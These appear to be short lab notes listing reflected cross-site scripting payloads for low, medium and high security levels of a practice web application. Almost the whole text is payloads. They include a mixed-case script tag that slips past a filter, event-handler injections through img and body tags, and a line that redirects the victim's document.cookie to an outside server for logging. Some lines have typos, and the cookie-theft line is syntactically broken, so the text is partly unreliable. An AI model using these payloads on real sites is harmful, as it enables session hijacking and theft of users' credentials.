# XSS Reflected
## Level Low Security
```javascript
<script>alert("XSS")</script>
// Need change input tag size to long
<script>alert(document.cookie)</script>
// Upload cookit to other server
<script>document.location='http://x.x.x.x/logit.pl?docuemnt.cookie</script>

```

## Level Medium Security
```javascript
<script>alert("XSS")</script>
// It happend because this time it is filtering script
<Script>alert("XSS")</sCript>
// It's working
```

## Level High Secrity
```javascript
<img src=ss OnError=alert("XSS") />
<body onload=alert("XSS")>
<body onload=alert(document.cookie)>
```
